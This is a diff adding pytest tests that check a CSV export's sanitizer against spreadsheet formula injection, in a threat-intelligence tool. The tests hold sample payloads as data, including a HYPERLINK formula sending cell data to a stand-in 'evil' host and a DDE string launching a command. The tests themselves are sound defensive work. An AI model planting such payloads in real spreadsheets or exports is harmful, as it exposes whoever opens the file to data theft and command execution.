@@ -8,7 +8,7 @@ import tempfile
 import pytest
 
 from app.database import get_connection, init_db
-from app.export.csv_export import render_csv
+from app.export.csv_export import render_csv, sanitize_csv_cell
 from app.export.misp_export import build_event
 from app.export.query import (
     Indicator,
@@ -153,6 +153,48 @@ def test_csv_header_and_rows():
     # Newline in context is flattened.
     assert "line1 line2" in out
     assert "\nline2" not in out.split("line1")[1][:10]
+
+
+# --- CSV formula injection (CWE-1236) ----------------------------------
+def test_sanitize_prefixes_formula_triggers():
+    for bad in ("=1+1", "+1", "-1", "@SUM(A1)", "\tcmd", "\rgo"):
+        assert sanitize_csv_cell(bad) == "'" + bad
+
+
+def test_sanitize_leaves_benign_values_untouched():
+    for ok in ("example.com", "CVE-2024-3400", "alice@example.com".lstrip("@"),
+               "1.2.3.4", "", "normal text"):
+        assert sanitize_csv_cell(ok) == ok
+
+
+def test_sanitize_passes_non_strings():
+    assert sanitize_csv_cell(42) == 42
+    assert sanitize_csv_cell(None) is None
+
+
+def test_render_csv_neutralizes_malicious_indicator_fields():
+    """An indicator whose value/context/title come from a hostile document
+    must not export a live formula."""
+    evil = Indicator(
+        value='=HYPERLINK("http://evil/"&A1,"x")',
+        itype="domain", severity="high", score=80,
+        first_seen="2026-01-01T00:00:00Z", source_name="@corp",
+        source_url="https://f/1", doc_title="=cmd|'/c calc'!A1",
+        context="-2+3+cmd",
+    )
+    out = render_csv([evil])
+    # None of the dangerous cells may begin with a raw formula trigger; each
+    # is prefixed with a single quote.
+    assert "'=HYPERLINK" in out
+    assert "'=cmd|" in out
+    assert "'-2+3+cmd" in out
+    assert "'@corp" in out
+    # And no data row cell starts a formula unescaped.
+    data_rows = out.strip().splitlines()[1:]
+    for row in data_rows:
+        for cell in row.split(","):
+            unquoted = cell.strip().strip('"')
+            assert not unquoted[:1] in ("=", "+", "-", "@"), row
 
 
 # --- STIX ---------------------------------------------------------------
